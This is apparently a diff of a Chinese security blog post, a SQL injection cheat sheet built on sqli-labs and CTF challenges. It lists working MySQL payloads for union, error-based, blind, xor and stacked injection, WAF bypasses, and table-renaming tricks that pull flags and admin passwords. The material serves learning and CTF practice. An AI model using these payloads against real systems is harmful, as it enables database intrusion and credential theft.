@@ -28,7 +28,7 @@
 <meta property="og:site_name" content="Z3ratu1&#39;s blog">
 <meta property="og:description" content="SQL injection 对SQL注入的一些常见payload和不同类型注入的总结 基础无过滤注入union联合注入 这种注入需要有回显位，使用联合注入union select，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用order by语句或者直接尝试来探取行数进行回显。 使用group_concat聚合函数将查询结果一次性输出，提高效率。 以sqli-lab的less1为例，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-12-09T11:24:02.900Z">
+<meta property="og:updated_time" content="2021-07-06T09:37:51.761Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://blog.z3ratu1.cn/SQL%20injection.html">
@@ -228,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-09 19:24:02" itemprop="dateModified" datetime="2020-12-09T19:24:02+08:00">2020-12-09</time>
+                <time title="修改时间：2021-07-06 17:37:51" itemprop="dateModified" datetime="2021-07-06T17:37:51+08:00">2021-07-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -282,7 +282,7 @@
 <h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>标准公式<code>union select 1 from (select count(),concat(floor(rand(0)*2),(注入语句))a from information_schema.tables group by a)b --+</code><br>这个方法具有一定的随机性，爆出来的数据取决于rand()函数，并且是以报错的形式显示出来。不怎么实用，原理如下<br><a href="https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html</a></p>
 <h3 id="盲注入"><a href="#盲注入" class="headerlink" title="盲注入"></a>盲注入</h3><p> 基于时间和bool类型的盲注入界面没有错误回显，也没有查询显示位，bool注入一般只有一个标志位确认你目前的语句是否正确<br> 时间类型的注入可能页面无任何回显，使用<code>sleep()</code>函数延迟判断结果是否正确<br> 此类注入手工注入十分麻烦，需要用一定的python基础写脚本跑比较好<br> 常用语句有<code>if length left limit</code><br> left(arg,n)取arg左边n位，用if判断<br> limit x,1 从第x位（从0开始）取1个</p>
 <h4 id="基于bool的盲注入"><a href="#基于bool的盲注入" class="headerlink" title="基于bool的盲注入"></a>基于bool的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code><br> 手工注入的时候可以不用等于号，用&gt;&lt;号加快注入速度<br> 这方面还有许多奇怪函数，待填坑</p>
-<h4 id="基于时间的盲注入"><a href="#基于时间的盲注入" class="headerlink" title="基于时间的盲注入"></a>基于时间的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; , sleep(3), 1) --+</code><br> 多一层if语句，判断正确则调用sleep函数，页面存在明显延迟<br> 简单讲一下if语句，if需要三个表达式，执行效果类似于C++中的 <code>a=b?a:b</code>语句</p>
+<h4 id="基于时间的盲注入"><a href="#基于时间的盲注入" class="headerlink" title="基于时间的盲注入"></a>基于时间的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; , sleep(3), 1) --+</code><br> 多一层if语句，判断正确则调用sleep函数，页面存在明显延迟<br> 还有一个替代sleep的函数，BENCHMARK(count,expr)，执行expr count次，可以通过执行简单的语句几千次来实现延时<br> 简单讲一下if语句，if需要三个表达式，执行效果类似于C++中的 <code>a=b?a:b</code>语句</p>
 <h3 id="使用update语句的注入"><a href="#使用update语句的注入" class="headerlink" title="使用update语句的注入"></a>使用update语句的注入</h3><p> 查询语句为常为<br> <code>UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$username&#39;</code></p>
 <h4 id="update后可见被更新数据的注入"><a href="#update后可见被更新数据的注入" class="headerlink" title="update后可见被更新数据的注入"></a>update后可见被更新数据的注入</h4><p> 将passwd改为<code>&#39;,username=database() #</code>即可将所有的用户名修改为database(),如果能观察到被修改的数据，即可完成注入，update语句中的select经常会遇到一些不期待的奇怪问题，如需嵌套两层select，并需要给其加上一个别名<br> 例如：<code>(select description from(select * from users where username=0x61646d696e)a)</code> </p>
 <h4 id="有语法错误回显的注入"><a href="#有语法错误回显的注入" class="headerlink" title="有语法错误回显的注入"></a>有语法错误回显的注入</h4><p> 该类型注入通常会对username进行强过滤，需要从password进行突破。一般是基于报错进行注入，常用函数为<code>extractvalue</code>和<code>updatexml</code>,操作在最后一步爆数据时略有差异。<br>sqli-lab的less17为例：</p>
@@ -292,7 +292,7 @@
 <p>再次报错<code>Every derived table must have its own</code>，需要给表加一个别名<br>payload为<code>1&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;)as test))) --+</code><br>此时注入就成功了。</p>
 <p>有时还会报一个返回的数据超过一行的错误，<code>Subquery returns more than 1 row</code>只需在where子句后再加上一句limit 0,1即可解决</p>
 </li>
-<li><p>使用<code>updatexml</code>函数<br><code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</code><br>同样遭遇上述报错，最终payload为<code>1&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;) test),0x7e),1) --+</code></p>
+<li><p>使用<code>updatexml</code>函数<br><code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</code><br> 同样遭遇上述报错，最终payload为<code>1&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;) test),0x7e),1) --+</code></p>
 <h3 id="导出文件型注入"><a href="#导出文件型注入" class="headerlink" title="导出文件型注入"></a>导出文件型注入</h3><p>本题来源为sqli-lab的less7<br>原理是利用SQL注入来获取getshell</p>
 <p>这里还是先把正规做法过一遍，首先是得到文件的路径，一般来说默认路径为<code>var/www/html</code><br>也有说不同服务器的默认路径有别，如下</p>
 <blockquote>
@@ -323,8 +323,8 @@
 <h4 id="sys库绕过"><a href="#sys库绕过" class="headerlink" title="sys库绕过"></a>sys库绕过</h4><p>innoDB绕过需要开启innoDB引擎，而mysql默认配置中该引擎是关闭的<br>使用sys库获取数据的话需要用户权限为root，可通过user()进行查看</p>
 <p>使用<code>sys.schema_auto_increment_columns</code>库可以获取带有自增id列的表的表名<br>使用<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>库可以获取任意表名（大概？）</p>
 <h4 id="join无列名注入"><a href="#join无列名注入" class="headerlink" title="join无列名注入"></a>join无列名注入</h4><p>先记一下payload<br>获取第一个列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b)c</code><br>获取后续列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</code></p>
-<h4 id="已知表名情况下爆破列名"><a href="#已知表名情况下爆破列名" class="headerlink" title="已知表名情况下爆破列名"></a>已知表名情况下爆破列名</h4><p>利用(select 1,2,3,4,5 union select * from table_name)alias<br>此处需要反引号不被过滤<br>获得一个将所有列名用数字表示的表，然后select `3` from (select 1,2,3,4,5 union select * from table_name)alias 即可将第三列无需列名的选出<br>结合实际情况的payload<br>select author_id,title from posts where author_id= <code>-1 union select 1,(select group_concat(\</code>3`) from (select 1,2,3,4,5 union select * from table_name)alias where 1=’1’ limit 0,1)` limit是保证查出来的数据只有一个<br>select 1,2,3,4,5即该表拥有五个列，group_concat将整个列的数据拼接起来，where 1=’1’为无效语句，用来闭合引号</p>
-<p>逗号被过滤时多取几个别名，可以不用逗号<br><code>select a from (select * from (select 1 \</code>a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from table2)x;`</p>
+<h4 id="已知表名情况下爆破列名"><a href="#已知表名情况下爆破列名" class="headerlink" title="已知表名情况下爆破列名"></a>已知表名情况下爆破列名</h4><p>利用(select 1,2,3,4,5 union select * from table_name)alias<br>此处需要反引号不被过滤<br>获得一个将所有列名用数字表示的表，然后<code>select `3` from (select 1,2,3,4,5 union select * from table_name)alias</code>即可将第三列无需列名的选出<br>结合实际情况的payload<br>select author_id,title from posts where author_id= <code>-1 union select 1,(select group_concat(`3`) from (select 1,2,3,4,5 union select * from table_name)alias where 1=&#39;1&#39; limit 0,1)</code> limit是保证查出来的数据只有一个<br>select 1,2,3,4,5即该表拥有五个列，group_concat将整个列的数据拼接起来，where 1=’1’为无效语句，用来闭合引号</p>
+<p>逗号被过滤时多取几个别名，可以不用逗号<br><code>select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from table2)x;</code></p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/4105#toc-0" target="_blank" rel="external nofollow noopener noreferrer">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a><br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="external nofollow noopener noreferrer">聊一聊bypass information_schema</a></p>
 <h3 id="异或盲注入"><a href="#异或盲注入" class="headerlink" title="异或盲注入"></a>异或盲注入</h3><p>除去union联合注入，使用异或(^)盲注入也是一种办法<br>这种方法比较容易用括号拼出来语句，比较使用，但是注入时需注意符号优先级，比如在^面前，大小于号和等号的优先级是不一样的，最简单的解决方案就是把该异或判断里面的所有内容再用一个括号括起来即可<br>样例payload：<br><code>?id=1&#39;^(left((select(database())),1)&lt;&#39;q&#39;)^&#39;1</code><br>纯用括号的payload：<br><code>?id=1&#39;^(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),9)=&#39;emails,re&#39;)^&#39;1</code><br>用group_concat函数把所有的表名连接起来，以逗号分隔，不需使用limit，即可直接猜解表名<br><strong>一定要注意这里要把后面注入的语句整体用括号括起来！！！不然就会存在异或优先级不同导致注入失败</strong></p>
 <h4 id="异或注入测试被过滤字符"><a href="#异或注入测试被过滤字符" class="headerlink" title="异或注入测试被过滤字符"></a>异或注入测试被过滤字符</h4><p><code>?id=1&#39;^length(&#39;测试字符串&#39;)&gt;0 #</code>即可测试被测试字符串是否被替换为空，进行被过滤项的测试</p>
@@ -342,21 +342,21 @@
 <h4 id="urlencode绕过waf"><a href="#urlencode绕过waf" class="headerlink" title="urlencode绕过waf"></a>urlencode绕过waf</h4><p>waf可以理解为服务器前的一个屏障，负责过滤输入的内容，而有的waf是直接提取我们的query_string，这种PHP性质的检测不会对我们的urlencode的数据进行解码，我们就可以以urlencode的形式进行绕过<br>例如：<code>u%6eion</code>就可以进行对union的绕过</p>
 <h4 id="二次解码绕过"><a href="#二次解码绕过" class="headerlink" title="二次解码绕过"></a>二次解码绕过</h4><p>有的网站存在着对url的二次解码，当我们的请求发送到服务器时，会发生第一次url解码，若此时还存在其他设置（如开启GPC），则会存在二次解码，此时我们可以使用<code>%2527</code>这样的语句通过二次解码构造注入<br>%25url解码为%，%27url解码为’</p>
 <h3 id="MySQL字符集绕过"><a href="#MySQL字符集绕过" class="headerlink" title="MySQL字符集绕过"></a>MySQL字符集绕过</h3><p>MySQL默认字符集为Latin1，当用户端的字符集为utf-8时，存在一个字符集转换过程，此时，不完整的utf-8编码会被舍弃，可以绕过类似于<code>&#39;username&#39;===&#39;admin&#39;</code>的条件。<br>具体情况贴一个博文<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>SQL语句后台查询时以;为分隔，如果我们在一次查询中使用分号隔开语句，即可实现执行两个语句。</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>SQL语句后台查询时以;为分隔，如果我们在一次查询中使用分号隔开语句，即可实现执行两个语句。<br>堆叠注入有时候不能得到返回值，所以需要用sleep之类的语句进行延时验证。但一般无法使用select时才会使用堆叠注入，因此可以使用<code>DO</code>语句进行执行，<code>DO</code>语句结束一个专门执行表达式的语句，在执行表达式上作为SELECT的替代品，eg:<code>DO sleep(5)</code></p>
 <h3 id="堆叠注入和union-select的区别"><a href="#堆叠注入和union-select的区别" class="headerlink" title="堆叠注入和union select的区别"></a>堆叠注入和union select的区别</h3><blockquote>
-<p>union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。 </p>
+<p>union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是<strong>任意的语句</strong>。 </p>
 </blockquote>
 <p>因为如果查询语句为<code>select * from users where username = $username</code>，使用union select就仍处于select语句下，而使用堆叠注入则可以重开一个语句，进行insert，delete等操作。</p>
 <h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>并不是所有的数据库都允许在一行中执行两个查询语句，某些API也会禁止或者开启这项功能，MySQL的某些版本可以执行堆叠注入，而Oracle就不允许这种操作，并且由于权限问题你也不一定能对数据进行修改</p>
 <h3 id="不使用select语句进行注入"><a href="#不使用select语句进行注入" class="headerlink" title="不使用select语句进行注入"></a>不使用select语句进行注入</h3><p>本题来自强网杯2019随便注</p>
 <h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>堆叠注入之后，我们可以执行任意语句，所以可以使用<code>show</code>来对数据进行展示<br><code>show database</code> <code>show tables/cloumns from xxxx</code>就可以直接对数据进行查询<br>最后一步没法使用show来进行查询了，而这里的语句应该为<code>select * from words where id=</code>，显示位由word表中的数据占据，且新开语句中无法使用select，这时我们将现在的表改名为words，还需将列对应修改为id和data，就能通过正常查询得到数据</p>
-<p>``是SQL中的转义字符，当我们的表名可能引起冲突时需要用``将其包围，保险起见可以将所有的表名用此包围<br>修改语句要在一次内做完，不然你先把words给改掉了，下次查询的时候先执行的select语句报错，后面还想把1919810931114514改成words就没戏了，同理还有对应的id和data<br>修改语句如下：rename table `tablename` to `new_tablename`，<br>增加数字列<br>alter table `tablename` add `columnname` int unsigned not Null auto_increment primary key<br>增加字符列<br>alert table `tablename` change `columnname` `newcolumnname`<br>抄一个完整的payload<br>?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</p>
+<p><code>`</code>是SQL中的转义字符，当我们的表名可能引起冲突时需要用<code>`</code>将其包围，保险起见可以将所有的表名用此包围<br>修改语句要在一次内做完，不然你先把words给改掉了，下次查询的时候先执行的select语句报错，后面还想把1919810931114514改成words就没戏了，同理还有对应的id和data<br>修改语句如下：<code>rename table `tablename` to `new_tablename`</code><br>增加数字列<br><code>alter table `tablename` add `columnname` int unsigned not Null auto_increment primary key</code><br>增加字符列<br><code>alert table `tablename` change `columnname` `newcolumnname`</code><br>抄一个完整的payload<br><code>?inject=1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p>
 <p>这个句子将flag改为id且设置了其类型为可变字符串，设置字符集为utf-8<br>由于我们并不知道现在的flag是多少，所以我们以?id=1’ or 1=1的形式查询到flag</p>
 <h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>玄妙的拼凑语句执行<br><code>use information_schema;set @sql=concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name=&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</code><br>感觉更加万能了，可以随意绕过</p>
 <h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，强网杯随便注强化版，给了一个超级过滤，直接把上面的所有方法给ban了<br><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>拼凑语句需要set和prepare，挂了，利用现有查询语句查需要rename，挂了，基本注入需要select，挂了，全挂。人傻了<br>最后师傅说用handler语句代替select堆叠注入，搜不到这个语句，最最最后直接搜wp才搜到这个东西。<br>这个语句是mysql独有的，其他数据库并不能使用</p>
 <pre class=" language-mysql"><code class="language-mysql">handler table_name open;
 handler table_name read first/next; #读第一行数据或读下一行数据</code></pre>
-<p>可以先用show tables;之类的语句摸清楚结构，然后用handler查询<br>payload: 1’;handler open FlagHere;handler FlagHere read first;#</p>
+<p>可以先用show tables;之类的语句摸清楚结构，然后用handler查询<br>payload: <code>1&#39;;handler open FlagHere;handler FlagHere read first;#</code></p>
 <h3 id="修改SQL配置的新知识"><a href="#修改SQL配置的新知识" class="headerlink" title="修改SQL配置的新知识"></a>修改SQL配置的新知识</h3><p>以SUCTF的easy_sql为例，这里后台的查询语句为<code>select $query || flag from Flag</code>（大佬wp说是判断出来了，我是判断不出来），测试之后发现注释符被过滤，or和union等常用语句被过滤，试了半天最后发现是整形注入，差点忘了这茬，但是可以使用堆叠注入。爆到列为Flag之后没法继续做了，这时拿出我们的新知识，修改<code>||</code>或运算符为连接符，就可以直接把flag给带出来啦。<br>payload<code>1;set sql_mode=pipes_as_concat;select 1</code></p>
 <p>这个题没出完，使用出现了很多低级的非预期解，比如<code>*,1</code>使得查询语句为<code>select *,1 || flag from Flag</code>这里1和后面的或结合，select  *就获取了全部数据</p>
 <h4 id="ps-1"><a href="#ps-1" class="headerlink" title="ps"></a>ps</h4><p>SQL字符串弱类型比较和PHP字符串和数字弱类型比较一致</p>
@@ -479,7 +479,7 @@ reverse(right(reverse(version()),1)</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
